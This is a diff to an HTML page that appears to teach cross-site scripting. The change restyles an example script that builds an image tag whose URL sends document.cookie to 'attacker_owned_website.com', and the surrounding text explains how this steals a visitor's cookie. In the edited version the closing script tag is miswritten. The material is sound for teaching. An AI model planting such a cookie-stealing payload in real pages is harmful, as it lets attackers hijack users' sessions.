@@ -126,15 +126,13 @@
                 <p>
                     Attacker starts by injecting JS code similar to this:
                 </p>
-                <ccode>
-                    <ul class='ccode'>
-                        <li><pre>&lt;script&gt;</pre></li>
-                        <li><pre>    var fakeImage = document.createElement("img");</pre></li>
-                        <li><pre>    fakeImage.src = "attacker_owned_website.com/image.png?cookie=" + document.cookie;</pre></li>
-                        <li><pre>    document.appendChild(fakeImage);</pre></li>
-                        <li><pre>&lt;/script&gt;</pre></li>
-                    </ul>
-                </ccode>
+                <ul class='ccode'>
+                    <li><pre>&lt;script&gt;</pre></li>
+                    <li><pre>    <span style='color:#2196f3'>var</span> fakeImage = document.<span style='color:#ffeb3b'>createElement</span>(<span style='color:#d8721a'>"img"</span>);</pre></li>
+                    <li><pre>    fakeImage.src = <span style='color:#d8721a'>"attacker_owned_website.com/image.png?cookie="</span> + document.cookie;</pre></li>
+                    <li><pre>    document.<span style='color:#ffeb3b'>appendChild</span>(fakeImage);</pre></li>
+                    <li><pre>&lt;script&gt;</pre></li>
+                </ul>
                 <p>
                     On first sight, it may seem this code is requesting an image from another server, which is a very common thing to do. No matter what that image is, or whether the request will succeed or not, the trick here is not about the image, but the request itself. This seemingly simple request has the user's cookie concatenated to the requesting URL. So, when a user browses to the infected website with this piece of code in it, the browser will automatically try to fetch this image from the attacker's server while sending the user's cookie along with it.
                 </p>
